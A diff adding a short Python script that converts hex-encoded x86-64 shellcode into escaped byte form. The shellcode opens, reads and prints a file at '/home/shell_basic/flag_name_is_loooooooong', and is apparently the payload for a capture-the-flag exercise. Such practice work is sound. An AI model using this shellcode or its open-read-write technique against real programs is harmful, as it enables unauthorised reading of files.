@@ -1,0 +1,7 @@
+hex_string = "4831c05048b86f6f6f6f6f6f6e675048b8616d655f69735f6c5048b8632f666c61675f6e5048b8656c6c5f626173695048b82f686f6d652f7368504889e74831f64831d2b8020000000f054889c74889e64883ee29b2294831c00f054831ff48ffc7b0010f054831ffb03c0f05"
+
+payload = bytes.fromhex(hex_string)
+payload = b"".join([f"\\x{b:02x}".encode() for b in payload])
+
+print(payload.decode())
+
